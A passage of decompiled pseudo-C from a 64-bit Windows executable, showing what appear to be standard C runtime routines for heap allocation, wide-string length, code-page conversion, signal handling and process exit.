// ----- sub_14001C6B8 @ 0x14001c6b8 -----
void __fastcall sub_14001C6B8(LPVOID *a1, __int64 a2)
{
  LPVOID *v2; // rdi
  LPVOID *i; // rbx

  v2 = &a1[a2];
  for ( i = a1; i != v2; ++i )
    sub_14001B590(*i);
}


// ----- sub_14001C6EC @ 0x14001c6ec -----
void __fastcall sub_14001C6EC(LPVOID *a1)
{
  if ( a1 != nullptr )
  {
    sub_14001C6B8(a1, 7);
    sub_14001C6B8(a1 + 7, 7);
    sub_14001C6B8(a1 + 14, 12);
    sub_14001C6B8(a1 + 26, 12);
    sub_14001C6B8(a1 + 38, 2);
    sub_14001B590(a1[40]);
    sub_14001B590(a1[41]);
    sub_14001B590(a1[42]);
    sub_14001C6B8(a1 + 44, 7);
    sub_14001C6B8(a1 + 51, 7);
    sub_14001C6B8(a1 + 58, 12);
    sub_14001C6B8(a1 + 70, 12);
    sub_14001C6B8(a1 + 82, 2);
    sub_14001B590(a1[84]);
    sub_14001B590(a1[85]);
    sub_14001B590(a1[86]);
    sub_14001B590(a1[87]);
  }
}


// ----- sub_14001C800 @ 0x14001c800 -----
LPVOID __fastcall sub_14001C800(unsigned __int64 a1)
{
  SIZE_T v1; // rbx
  LPVOID result; // rax

  v1 = a1;
  if ( a1 > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_9:
    *(_DWORD *)sub_14001A8F0() = 12;
    return nullptr;
  }
  else
  {
    if ( a1 == 0 )
      v1 = 1;
    while ( 1 )
    {
      result = HeapAlloc(qword_1400277A8, 0, v1);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_14001D310() == 0 || (unsigned int)sub_14001D210(v1) == 0 )
        goto LABEL_9;
    }
  }
  return result;
}


// ----- sub_14001C860 @ 0x14001c860 -----
__int64 __fastcall sub_14001C860(_WORD *a1, unsigned __int64 a2)
{
  _WORD *v6; // rax
  _WORD *v7; // rdx
  __int64 result; // rax
  unsigned __int64 v9; // r10
  __int64 v10; // rcx
  _WORD *v11; // rdx
  unsigned __int64 v12; // r10
  _WORD *v13; // rax
  __int64 v14; // rdx
  _WORD *v15; // r8
  _WORD *i; // rdx
  _WORD *j; // rax
  _WORD *v19; // rcx
  _WORD *k; // rax
  unsigned __int64 v21; // r10
  __int64 v22; // rcx
  _WORD *v23; // rax
  unsigned __int64 v24; // r10
  _WORD *v25; // rcx
  __m128i *v26; // r8
  __m128i *m; // rcx
  __m128i *n; // rax
  _WORD *v29; // rcx

  if ( dword_140026610 >= 5 )
  {
    if ( ((unsigned __int8)a1 & 1) != 0 )
    {
      v6 = &a1[a2];
      v7 = a1;
      if ( a1 != v6 )
      {
        while ( *v7 != 0 )
        {
          if ( ++v7 == v6 )
            return v7 - a1;
        }
      }
    }
    else
    {
      v9 = 0;
      v10 = (unsigned __int8)a1 & 0x1F;
      v11 = a1;
      if ( v10 != 0 )
        v9 = 32 - v10;
      v12 = v9 >> 1;
      if ( a2 < v12 )
        v12 = a2;
      v13 = &a1[v12];
      if ( a1 != v13 )
      {
        do
        {
          if ( *v11 == 0 )
            break;
          ++v11;
        }
        while ( v11 != v13 );
      }
      v14 = v11 - a1;
      if ( v14 != v12 )
        return v14;
      v15 = &a1[v14];
      for ( i = &a1[v14 + a2 - v12 - (((_BYTE)a2 - (_BYTE)v12) & 0x1F)]; v15 != i; v15 += 16 )
      {
        __asm
        {
          vpxor   xmm1, xmm1, xmm1
          vpcmpeqw ymm1, ymm1, ymmword ptr [r8]
          vpmovmskb eax, ymm1
        }
        __asm { vzeroupper }
        if ( _EAX != 0 )
          break;
      }
      for ( j = &a1[a2]; v15 != j; ++v15 )
      {
        if ( *v15 == 0 )
          break;
      }
      v7 = v15;
    }
    return v7 - a1;
  }
  if ( dword_140026610 < 1 )
  {
    v29 = &a1[a2];
    for ( k = a1; k != v29; ++k )
    {
      if ( *k == 0 )
        break;
    }
    return k - a1;
  }
  if ( ((unsigned __int8)a1 & 1) != 0 )
  {
    v19 = &a1[a2];
    k = a1;
    if ( a1 != v19 )
    {
      while ( *k != 0 )
      {
        if ( ++k == v19 )
          return k - a1;
      }
    }
    return k - a1;
  }
  v21 = 0;
  v22 = (unsigned __int8)a1 & 0xF;
  if ( v22 != 0 )
    v21 = 16 - v22;
  v23 = a1;
  v24 = v21 >> 1;
  if ( a2 < v24 )
    v24 = a2;
  v25 = &a1[v24];
  if ( a1 != v25 )
  {
    do
    {
      if ( *v23 == 0 )
        break;
      ++v23;
    }
    while ( v23 != v25 );
  }
  result = v23 - a1;
  if ( result == v24 )
  {
    v26 = (__m128i *)&a1[result];
    for ( m = (__m128i *)&a1[result + a2 - v24 - (((_BYTE)a2 - (_BYTE)v24) & 0xF)]; v26 != m; ++v26 )
    {
      if ( _mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *v26)) != 0 )
        break;
    }
    for ( n = (__m128i *)&a1[a2]; v26 != n; v26 = (__m128i *)((char *)v26 + 2) )
    {
      if ( v26->m128i_i16[0] == 0 )
        break;
    }
    return ((char *)v26 - (char *)a1) >> 1;
  }
  return result;
}


// ----- sub_14001CA68 @ 0x14001ca68 -----
__int64 __fastcall sub_14001CA68(
        _OWORD *a1,
        DWORD a2,
        __int64 a3,
        unsigned int a4,
        WORD *lpCharType,
        unsigned int a6,
        int a7)
{
  unsigned int v10; // edi
  int v11; // eax
  __int64 v12; // r14
  unsigned int StringTypeW; // edi
  unsigned __int64 v14; // rcx
  __int64 v15; // rax
  void *v16; // rsp
  const WCHAR *v17; // rbx
  WCHAR *v18; // rax
  int v19; // eax
  __int64 v21; // [rsp+0h] [rbp-30h] BYREF
  int v22; // [rsp+30h] [rbp+0h] BYREF
  _QWORD v23[3]; // [rsp+38h] [rbp+8h] BYREF
  char v24; // [rsp+50h] [rbp+20h]

  sub_14001A020((__int64)v23, a1);
  v10 = a6;
  if ( a6 == 0 )
    v10 = *(_DWORD *)(v23[1] + 12LL);
  v11 = sub_14001CBF8(v10, a7 != 0 ? 9 : 1, a3, a4, 0, 0);
  v12 = v11;
  if ( v11 == 0 )
  {
    StringTypeW = 0;
    goto LABEL_21;
  }
  v14 = (2LL * v11 + 16) & -(__int64)(2LL * v11 < (unsigned __int64)(2LL * v11 + 16));
  if ( v14 == 0 )
  {
    v17 = nullptr;
    goto LABEL_18;
  }
  if ( v14 <= 0x400 )
  {
    v15 = v14 + 15;
    if ( v14 + 15 < v14 )
      v15 = 0xFFFFFFFFFFFFFF0LL;
    v16 = alloca(v15 & 0xFFFFFFFFFFFFFFF0uLL);
    v17 = (const WCHAR *)&v22;
    if ( &v21 == (__int64 *)-48LL )
    {
LABEL_18:
      StringTypeW = 0;
      if ( v17 == nullptr )
        goto LABEL_21;
      goto LABEL_19;
    }
    v22 = 52428;
    goto LABEL_13;
  }
  v18 = (WCHAR *)sub_14001C800(v14);
  v17 = v18;
  if ( v18 != nullptr )
  {
    *(_DWORD *)v18 = 56797;
LABEL_13:
    v17 += 8;
  }
  if ( v17 == nullptr )
    goto LABEL_18;
  sub_1400230C0(v17, 0, 2 * v12);
  v19 = sub_14001CBF8(v10, 1, a3, a4, v17, v12);
  if ( v19 == 0 )
    goto LABEL_18;
  StringTypeW = GetStringTypeW(a2, v17, v19, lpCharType);
LABEL_19:
  if ( *((_DWORD *)v17 - 4) == 56797 )
    sub_14001B590((LPVOID)(v17 - 8));
LABEL_21:
  if ( v24 != 0 )
    *(_DWORD *)(v23[0] + 936LL) &= ~2u;
  return StringTypeW;
}


// ----- sub_14001CBF8 @ 0x14001cbf8 -----
int __fastcall sub_14001CBF8(UINT a1, char a2, const CHAR *a3, int a4, WCHAR *a5, int a6)
{
  bool v6; // zf

  if ( a1 > 0xDEAC )
  {
    if ( a1 == 57005
      || a1 == 57006
      || a1 == 57007
      || a1 == 57008
      || a1 == 57009
      || a1 == 57010
      || a1 == 57011
      || a1 == 65000 )
    {
      goto LABEL_15;
    }
    if ( a1 != 65001 )
      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
    goto LABEL_26;
  }
  if ( a1 == 57004 )
    goto LABEL_15;
  if ( a1 > 0xC433 )
  {
    if ( a1 == 50229 )
      goto LABEL_15;
    if ( a1 != 54936 )
    {
      if ( a1 != 57002 )
      {
        v6 = a1 == 57003;
        goto LABEL_14;
      }
LABEL_15:
      a2 = 0;
      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
    }
LABEL_26:
    a2 &= 8u;
    return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
  }
  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )
    goto LABEL_15;
  v6 = a1 == 50225;
LABEL_14:
  if ( v6 )
    goto LABEL_15;
  return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
}


// ----- sub_14001CC88 @ 0x14001cc88 -----
void __fastcall sub_14001CC88(__int64 a1, int *a2, __int64 a3, int *a4)
{
  sub_14001B374(*a2);
  sub_14001CCC0(a3);
  sub_14001B390(*a4);
}


// ----- sub_14001CCC0 @ 0x14001ccc0 -----
int *__fastcall sub_14001CCC0(int **a1)
{
  int v2; // ecx
  void *v3; // rcx
  int *result; // rax

  if ( byte_140027770 != 0 )
    return result;
  _InterlockedExchange(&dword_140027764, 1);
  v2 = **a1;
  if ( v2 == 0 )
  {
    if ( qword_140027768 != _security_cookie )
      ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))__ROR8__(
                                                      qword_140027768 ^ _security_cookie,
                                                      _security_cookie & 0x3F))(
        0,
        0,
        0);
    v3 = &unk_1400277B0;
    goto LABEL_8;
  }
  if ( v2 == 1 )
  {
    v3 = &unk_1400277C8;
LABEL_8:
    sub_14001D9A4(v3);
  }
  if ( **a1 == 0 )
    sub_14001D818(&qword_140001038, &qword_140001058);
  sub_14001D818(&qword_140001060, &qword_140001068);
  result = a1[1];
  if ( *result == 0 )
  {
    byte_140027770 = 1;
    result = a1[2];
    *(_BYTE *)result = 1;
  }
  return result;
}


// ----- sub_14001CD80 @ 0x14001cd80 -----
void __fastcall sub_14001CD80(UINT uExitCode, int a2, int a3)
{
  HMODULE ModuleHandleW; // rax
  char *v5; // rcx
  _BYTE v6[4]; // [rsp+20h] [rbp-30h] BYREF
  int v7; // [rsp+24h] [rbp-2Ch] BYREF
  int v8; // [rsp+28h] [rbp-28h] BYREF
  __int64 v9; // [rsp+30h] [rbp-20h]
  _QWORD v10[3]; // [rsp+38h] [rbp-18h] BYREF
  int v11; // [rsp+68h] [rbp+18h] BYREF
  int v12; // [rsp+70h] [rbp+20h] BYREF
  char v13; // [rsp+78h] [rbp+28h] BYREF

  v12 = a3;
  v11 = a2;
  v9 = -2;
  if ( a3 == 0 )
  {
    ModuleHandleW = GetModuleHandleW(nullptr);
    if ( ModuleHandleW != nullptr && *(_WORD *)ModuleHandleW == 23117 )
    {
      v5 = (char *)ModuleHandleW + *((int *)ModuleHandleW + 15);
      if ( *(_DWORD *)v5 == 17744
        && *((_WORD *)v5 + 12) == 523
        && *((_DWORD *)v5 + 33) > 0xEu
        && *((_DWORD *)v5 + 62) != 0 )
      {
        sub_14001CE94(uExitCode);
      }
    }
  }
  v13 = 0;
  v10[0] = &v11;
  v10[1] = &v12;
  v10[2] = &v13;
  v7 = 2;
  v8 = 2;
  sub_14001CC88((__int64)v6, &v8, (__int64)v10, &v7);
  if ( v12 == 0 )
  {
    if ( (unsigned int)sub_14001B454() != 1 )
      sub_14001D1D8();
    if ( v12 == 0 )
      sub_14001CE64(uExitCode);
  }
}


// ----- sub_14001CE64 @ 0x14001ce64 -----
void __fastcall __noreturn sub_14001CE64(UINT uExitCode, char a2)
{
  HANDLE CurrentProcess; // rax

  if ( a2 != 0 )
  {
    CurrentProcess = GetCurrentProcess();
    TerminateProcess(CurrentProcess, uExitCode);
  }
  sub_14001CE94(uExitCode);
  ExitProcess(uExitCode);
}


// ----- sub_14001CE94 @ 0x14001ce94 -----
int __fastcall sub_14001CE94(unsigned int a1)
{
  FARPROC CorExitProcess; // rax
  HMODULE v3; // rcx
  HMODULE phModule; // [rsp+48h] [rbp+10h] BYREF

  phModule = nullptr;
  LODWORD(CorExitProcess) = GetModuleHandleExW(0, L"mscoree.dll", &phModule);
  v3 = phModule;
  if ( (_DWORD)CorExitProcess != 0 )
  {
    CorExitProcess = GetProcAddress(phModule, "CorExitProcess");
    if ( CorExitProcess != nullptr )
      LODWORD(CorExitProcess) = ((__int64 (__fastcall *)(_QWORD))CorExitProcess)(a1);
    v3 = phModule;
  }
  if ( v3 != nullptr )
    LODWORD(CorExitProcess) = FreeLibrary(v3);
  return (int)CorExitProcess;
}


// ----- sub_14001CEF8 @ 0x14001cef8 -----
void __fastcall sub_14001CEF8(UINT a1)
{
  sub_14001CD80(a1, 2, 0);
}


// ----- sub_14001CF04 @ 0x14001cf04 -----
__int64 __fastcall sub_14001CF04(__int64 a1, int *a2, __int64 a3, int *a4)
{
  __int64 v5; // rbx

  sub_14001B374(*a2);
  v5 = __ROR8__(_security_cookie ^ qword_140027788, _security_cookie & 0x3F);
  sub_14001B390(*a4);
  return v5;
}


// ----- sub_14001CF4C @ 0x14001cf4c -----
__int64 sub_14001CF4C()
{
  __int64 v1; // [rsp+30h] [rbp+8h] BYREF
  int v2; // [rsp+38h] [rbp+10h] BYREF
  int v3; // [rsp+40h] [rbp+18h] BYREF

  v2 = 3;
  v3 = 3;
  return sub_14001CF04((__int64)&v1, &v3, (__int64)&v1, &v2);
}


// ----- sub_14001CF7C @ 0x14001cf7c -----
__int64 __fastcall sub_14001CF7C(unsigned int a1)
{
  _QWORD *v2; // r15
  char v3; // r14
  __int64 v4; // rdx
  unsigned int v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  unsigned int v8; // ecx
  __int64 *v9; // rdi
  _QWORD *v10; // rax
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 v14; // r13
  __int64 v15; // rsi
  int v16; // r12d
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // rax
  int v20; // [rsp+78h] [rbp+10h]

  v2 = nullptr;
  v20 = 0;
  v3 = 1;
  v4 = a1 - 2;
  if ( a1 != 2 )
  {
    if ( a1 == 4 )
      goto LABEL_14;
    v4 = a1 - 6;
    if ( a1 == 6 )
      goto LABEL_8;
    if ( a1 == 8 || a1 == 11 )
    {
LABEL_14:
      v10 = sub_14001B074();
      v2 = v10;
      if ( v10 == nullptr )
        return 0xFFFFFFFFLL;
      v12 = *v10;
      v13 = v12 + 192;
      while ( v12 != v13 )
      {
        if ( *(_DWORD *)(v12 + 4) == a1 )
          goto LABEL_21;
        v12 += 16;
      }
      v12 = 0;
LABEL_21:
      if ( v12 != 0 )
      {
        v9 = (__int64 *)(v12 + 8);
        v3 = 0;
        goto LABEL_28;
      }
    }
    else
    {
      v4 = a1 - 15;
      if ( a1 == 15 )
        goto LABEL_8;
      v4 = a1 - 21;
      if ( (unsigned int)v4 <= 1 )
        goto LABEL_8;
    }
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
    return 0xFFFFFFFFLL;
  }
LABEL_8:
  v5 = a1 - 2;
  if ( v5 != 0 )
  {
    v6 = v5 - 4;
    if ( v6 == 0 )
    {
LABEL_24:
      v9 = &qword_140027788;
      goto LABEL_28;
    }
    v7 = v6 - 9;
    if ( v7 != 0 )
    {
      v8 = v7 - 6;
      if ( v8 != 0 )
      {
        if ( v8 != 1 )
        {
          v9 = nullptr;
          goto LABEL_28;
        }
        goto LABEL_24;
      }
      v9 = (__int64 *)&unk_140027780;
    }
    else
    {
      v9 = (__int64 *)&unk_140027790;
    }
  }
  else
  {
    v9 = (__int64 *)&unk_140027778;
  }
LABEL_28:
  v14 = 0;
  if ( v3 != 0 )
    sub_14001B374(3);
  v15 = *v9;
  if ( v3 != 0 )
    v15 = __ROR8__(_security_cookie ^ v15, _security_cookie & 0x3F);
  if ( v15 == 1 )
  {
    v16 = 2320;
    goto LABEL_44;
  }
  if ( v15 == 0 )
  {
    if ( v3 != 0 )
      sub_14001B390(3);
    sub_14001CEF8(3u);
    __debugbreak();
  }
  v16 = 2320;
  if ( a1 > 0xB || !_bittest(&v16, a1) )
    goto LABEL_38;
  v14 = v2[1];
  v2[1] = 0;
  if ( a1 == 8 )
  {
    v20 = *(_DWORD *)(sub_14001B014() + 16);
    *(_DWORD *)(sub_14001B014() + 16) = 140;
LABEL_38:
    if ( a1 == 8 )
    {
      v17 = *v2 + 48LL;
      v18 = *v2 + 192LL;
      while ( v17 != v18 )
      {
        *(_QWORD *)(v17 + 8) = 0;
        v17 += 16;
      }
      goto LABEL_44;
    }
  }
  *v9 = _security_cookie;
LABEL_44:
  if ( v3 != 0 )
    sub_14001B390(3);
  if ( v15 != 1 )
  {
    if ( a1 == 8 )
    {
      v19 = sub_14001B014();
      ((void (__fastcall *)(__int64, _QWORD))v15)(8, *(unsigned int *)(v19 + 16));
    }
    else
    {
      ((void (__fastcall *)(_QWORD, __int64))v15)(a1, v4);
    }
    if ( a1 <= 0xB && _bittest(&v16, a1) )
    {
      v2[1] = v14;
      if ( a1 == 8 )
        *(_DWORD *)(sub_14001B014() + 16) = v20;
    }
  }
  return 0;
}


// ----- sub_14001D1D8 @ 0x14001d1d8 -----
char sub_14001D1D8()
{
  return BYTE1(NtCurrentTeb()->ProcessEnvironmentBlock->NtGlobalFlag) & 1;
}


// ----- sub_14001D1F4 @ 0x14001d1f4 -----
__int64 sub_14001D1F4()
{
  return NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Flags >> 31;
}


// ----- sub_14001D210 @ 0x14001d210 -----
unsigned int (__fastcall *__fastcall sub_14001D210(__int64 a1))(__int64)
{
  unsigned int (__fastcall *result)(__int64); // rax
  unsigned int v3; // ebx

  result = (unsigned int (__fastcall *)(__int64))sub_14001D260();
  v3 = 0;
  if ( result != nullptr )
  {
    LOBYTE(v3) = result(a1) != 0;
    return (unsigned int (__fastcall *)(__int64))v3;
  }
  return result;
}


// ----- sub_14001D250 @ 0x14001d250 -----
void __fastcall sub_14001D250(__int64 a1)
{
  qword_140027798 = a1;
}


// ----- sub_14001D260 @ 0x14001d260 -----
__int64 sub_14001D260()
{
  __int64 v0; // rbx

  sub_14001B374(0);
  v0 = __ROR8__(_security_cookie ^ qword_140027798, _security_cookie & 0x3F);
  sub_14001B390(0);
  return v0;
}


// ----- sub_14001D2A0 @ 0x14001d2a0 -----
__int64 __fastcall sub_14001D2A0(__int64 a1)
{
  __int64 v2; // rbx

  sub_14001B374(0);
  v2 = __ROR8__(qword_140027798 ^ _security_cookie, _security_cookie & 0x3F);
  qword_140027798 = _security_cookie ^ __ROR8__(a1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  sub_14001B390(0);
  return v2;
}


// ----- sub_14001D300 @ 0x14001d300 -----
__int64 sub_14001D300()
{
  return sub_14001D2A0(_security_cookie);
}


// ----- sub_14001D310 @ 0x14001d310 -----
__int64 sub_14001D310()
{
  return (unsigned int)dword_1400277A0;
}


// ----- sub_14001D320 @ 0x14001d320 -----
__int64 __fastcall sub_14001D320(unsigned __int32 a1)
{
  if ( a1 <= 1 )
    return (unsigned int)_InterlockedExchange(&dword_1400277A0, a1);
  *(_DWORD *)sub_14001A8F0() = 22;
  sub_14001A770();
  return 0xFFFFFFFFLL;
}


// ----- sub_14001D350 @ 0x14001d350 -----
HANDLE sub_14001D350()
{
  return qword_1400277A8;
}


// ----- sub_14001D360 @ 0x14001d360 -----
bool sub_14001D360()
{
  qword_1400277A8 = GetProcessHeap();
  return qword_1400277A8 != nullptr;
}


// ----- sub_14001D390 @ 0x14001d390 -----
char sub_14001D390()
{
  qword_1400277A8 = nullptr;
  return 1;
}


// ----- sub_14001D3B0 @ 0x14001d3b0 -----
HANDLE sub_14001D3B0()
{
  return qword_1400277A8;
}


// ----- sub_14001D3B8 @ 0x14001d3b8 -----
int __fastcall sub_14001D3B8(
        __int64 a1,
        __int64 a2,
        DWORD a3,
        const CHAR *a4,
        int a5,
        WCHAR *a6,
        int a7,
        UINT a8,
        int a9)
{
  int v9; // edi
  int v14; // eax
  UINT v15; // r14d
  int result; // eax
  __int64 v17; // r15
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // rax
  __int64 v20; // rcx
  unsigned __int64 v21; // rcx
  void *v22; // rsp
  void *v23; // rsp
  WCHAR *v24; // rbx
  WCHAR *v25; // rax
  int v26; // eax
  int v27; // esi
  unsigned __int64 v28; // rcx
  __int64 v29; // rax
  void *v30; // rsp
  WCHAR *v31; // rdi
  WCHAR *v32; // rax
  _BYTE v33[32]; // [rsp+0h] [rbp-50h] BYREF
  __int64 v34; // [rsp+30h] [rbp-20h]
  __int64 v35; // [rsp+38h] [rbp-18h]
  int v36; // [rsp+50h] [rbp+0h] BYREF

  v9 = a5;
  if ( a5 > 0 )
  {
    v14 = sub_14001DA20(a4, a5);
    v9 = v14 + 1;
    if ( v14 >= a5 )
      v9 = v14;
  }
  v15 = a8;
  if ( a8 == 0 )
    v15 = *(_DWORD *)(*(_QWORD *)a1 + 12LL);
  result = sub_14001CBF8(v15, a9 != 0 ? 9 : 1, a4, v9, nullptr, 0);
  v17 = result;
  if ( result != 0 )
  {
    v18 = 2LL * result + 16;
    v19 = v18 & -(__int64)(2LL * result < v18);
    if ( (v18 & -(__int64)(2 * v17 < v18)) == 0 )
    {
      v24 = nullptr;
      goto LABEL_47;
    }
    if ( v19 > 0x400 )
    {
      v25 = (WCHAR *)sub_14001C800(v18 & -(__int64)(2 * v17 < v18));
      v24 = v25;
      if ( v25 == nullptr )
      {
LABEL_16:
        if ( v24 != nullptr && sub_14001CBF8(v15, 1, a4, v9, v24, v17) != 0 )
        {
          v26 = sub_14001AB48(a2, a3, v24, v17, nullptr, 0, 0, 0, 0);
          v27 = v26;
          if ( v26 != 0 )
          {
            if ( (a3 & 0x400) != 0 )
            {
              if ( a7 == 0 )
                goto LABEL_48;
              if ( v26 <= a7 )
              {
                v27 = sub_14001AB48(a2, a3, v24, v17, a6, a7, 0, 0, 0);
                if ( v27 != 0 )
                  goto LABEL_48;
              }
              goto LABEL_47;
            }
            v28 = (2LL * v26 + 16) & -(__int64)(2LL * v26 < (unsigned __int64)(2LL * v26 + 16));
            if ( v28 == 0 )
            {
              v31 = nullptr;
              goto LABEL_42;
            }
            if ( v28 > 0x400 )
            {
              v32 = (WCHAR *)sub_14001C800(v28);
              v31 = v32;
              if ( v32 == nullptr )
                goto LABEL_33;
              *(_DWORD *)v32 = 56797;
            }
            else
            {
              v29 = v28 + 15;
              if ( v28 + 15 < v28 )
                v29 = 0xFFFFFFFFFFFFFF0LL;
              v30 = alloca(v29 & 0xFFFFFFFFFFFFFFF0uLL);
              v31 = (WCHAR *)&v36;
              if ( v33 == (_BYTE *)-80LL )
                goto LABEL_45;
              v36 = 52428;
            }
            v31 += 8;
LABEL_33:
            if ( v31 == nullptr )
              goto LABEL_45;
            if ( sub_14001AB48(a2, a3, v24, v17, v31, v27, 0, 0, 0) != 0 )
            {
              v35 = 0;
              v34 = 0;
              if ( a7 != 0 )
              {
                v27 = sub_14001DA38(v15, 0, (_DWORD)v31, v27, (_DWORD)a6, a7, v34, v35);
                if ( v27 == 0 )
                  goto LABEL_43;
              }
              else
              {
                v27 = sub_14001DA38(v15, 0, (_DWORD)v31, v27, 0, 0, v34, v35);
                if ( v27 == 0 )
                  goto LABEL_42;
              }
              if ( *((_DWORD *)v31 - 4) == 56797 )
                sub_14001B590(v31 - 8);
              goto LABEL_48;
            }
LABEL_42:
            if ( v31 != nullptr )
            {
LABEL_43:
              if ( *((_DWORD *)v31 - 4) == 56797 )
                sub_14001B590(v31 - 8);
            }
LABEL_45:
            v27 = 0;
            goto LABEL_48;
          }
        }
LABEL_47:
        v27 = 0;
        if ( v24 == nullptr )
          return v27;
LABEL_48:
        if ( *((_DWORD *)v24 - 4) == 56797 )
          sub_14001B590(v24 - 8);
        return v27;
      }
      *(_DWORD *)v25 = 56797;
    }
    else
    {
      v20 = v19 + 15;
      if ( v19 + 15 < v19 )
        v20 = 0xFFFFFFFFFFFFFF0LL;
      v21 = v20 & 0xFFFFFFFFFFFFFFF0uLL;
      v22 = alloca(v21);
      v23 = alloca(v21);
      v24 = (WCHAR *)&v36;
      if ( v33 == (_BYTE *)-80LL )
        goto LABEL_47;
      v36 = 52428;
    }
    v24 += 8;
    goto LABEL_16;
  }
  return result;
}


// ----- sub_14001D6EC @ 0x14001d6ec -----
int __fastcall sub_14001D6EC(
        _OWORD *a1,
        __int64 a2,
        DWORD a3,
        const CHAR *a4,
        int a5,
        WCHAR *a6,
        int a7,
        UINT a8,
        int a9)
{
  int result; // eax
  __int64 v13; // [rsp+50h] [rbp-28h] BYREF
  _BYTE v14[24]; // [rsp+58h] [rbp-20h] BYREF

  sub_14001A020((__int64)&v13, a1);
  result = sub_14001D3B8((__int64)v14, a2, a3, a4, a5, a6, a7, a8, a9);
  if ( v14[16] != 0 )
    *(_DWORD *)(v13 + 936) &= ~2u;
  return result;
}


// ----- sub_14001D784 @ 0x14001d784 -----
__int64 sub_14001D784()
{
  return (unsigned __int8)sub_14001C1FC() ^ 1u;
}


// ----- sub_14001D7A0 @ 0x14001d7a0 -----
__int64 __fastcall sub_14001D7A0(__int64 a1)
{
  __int64 v2; // rsi
  __int64 result; // rax

  v2 = sub_14001A38C(a1);
  *(_QWORD *)(a1 + 24) = *(_QWORD *)(v2 + 144);
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(v2 + 136);
  sub_14001B194(v2, (__int64 *)(a1 + 24), *(_QWORD *)(a1 + 8));
  sub_14001B200(v2, (__int64 *)(a1 + 32), *(_QWORD *)(a1 + 8));
  result = *(unsigned int *)(v2 + 936);
  if ( (result & 2) == 0 )
  {
    result = (unsigned int)result | 2;
    *(_DWORD *)(v2 + 936) = result;
    *(_BYTE *)(a1 + 40) = 2;
  }
  return result;
}


// ----- sub_14001D818 @ 0x14001d818 -----
void __fastcall sub_14001D818(void (**a1)(void), void (**a2)(void))
{
  void (**v3)(void); // rbx

  if ( a1 != a2 )
  {
    v3 = a1;
    do
    {
      if ( *v3 != nullptr )
        (*v3)();
      ++v3;
    }
    while ( v3 != a2 );
  }
}


// ----- sub_14001D850 @ 0x14001d850 -----
__int64 __fastcall sub_14001D850(__int64 a1, int *a2, __int64 a3, int *a4)
{
  sub_14001B374(*a2);
  LODWORD(a3) = sub_14001D88C(a3);
  sub_14001B390(*a4);
  return (unsigned int)a3;
}


// ----- sub_14001D88C @ 0x14001d88c -----
__int64 __fastcall sub_14001D88C(_QWORD **a1)
{
  _QWORD *v2; // rdx
  uintptr_t v4; // r8
  uintptr_t *v5; // rdi
  uintptr_t *v6; // rbx
  uintptr_t v7; // r14
  char v8; // cl
  uintptr_t *v9; // r15
  uintptr_t *v10; // rbp
  uintptr_t v11; // rax
  _QWORD *v12; // rdx
  char *v13; // r9
  uintptr_t *v14; // rax

  v2 = (_QWORD *)**a1;
  if ( v2 == nullptr )
    return 0xFFFFFFFFLL;
  v4 = _security_cookie;
  v5 = (uintptr_t *)__ROR8__(*v2 ^ _security_cookie, _security_cookie & 0x3F);
  v6 = (uintptr_t *)__ROR8__(v2[1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( (unsigned __int64)v5 - 1 <= 0xFFFFFFFFFFFFFFFDuLL )
  {
    v7 = _security_cookie;
    v8 = _security_cookie & 0x3F;
    v9 = v5;
    v10 = v6;
    while ( --v6 >= v5 )
    {
      v11 = *v6;
      if ( *v6 != v7 )
      {
        *v6 = v7;
        ((void (*)(void))__ROR8__(v4 ^ v11, v8))();
        v4 = _security_cookie;
        v8 = _security_cookie & 0x3F;
        v12 = (_QWORD *)**a1;
        v13 = (char *)__ROR8__(*v12 ^ _security_cookie, _security_cookie & 0x3F);
        v14 = (uintptr_t *)__ROR8__(v12[1] ^ _security_cookie, _security_cookie & 0x3F);
        if ( v13 != (char *)v9 || v14 != v10 )
        {
          v9 = (uintptr_t *)v13;
          v5 = (uintptr_t *)v13;
          v10 = v14;
          v6 = v14;
        }
      }
    }
    if ( v5 != (uintptr_t *)-1LL )
    {
      sub_14001B590(v5);
      v4 = _security_cookie;
    }
    *(_QWORD *)**a1 = v4;
    *(_QWORD *)(**a1 + 8LL) = v4;
    *(_QWORD *)(**a1 + 16LL) = v4;
  }
  return 0;
}


// ----- sub_14001D9A4 @ 0x14001d9a4 -----
__int64 __fastcall sub_14001D9A4(__int64 a1)
{
  _QWORD v2[3]; // [rsp+20h] [rbp-18h] BYREF
  __int64 v3; // [rsp+40h] [rbp+8h] BYREF
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  v2[1] = -2;
  v2[0] = &v3;
  v5 = 2;
  v6 = 2;
  return sub_14001D850((__int64)&v4, &v6, (__int64)v2, &v5);
}


// ----- sub_14001D9E8 @ 0x14001d9e8 -----
void __noreturn sub_14001D9E8()
{
  void (*v0)(void); // rax

  v0 = *(void (**)(void))(sub_14001B014() + 24);
  if ( v0 != nullptr )
    v0();
  sub_14001B2E4();
}


// ----- _guard_check_icall_nop @ 0x14001da10 -----
void guard_check_icall_nop()
{
  ;
}


// ----- sub_14001DA20 @ 0x14001da20 -----
__int64 __fastcall sub_14001DA20(_BYTE *a1, __int64 a2)
{
  __int64 result; // rax

  result = 0;
  if ( *a1 != 0 )
  {
    do
    {
      if ( result == a2 )
        break;
      ++result;
    }
    while ( a1[result] != 0 );
  }
  return result;
}


// ----- sub_14001DA38 @ 0x14001da38 -----
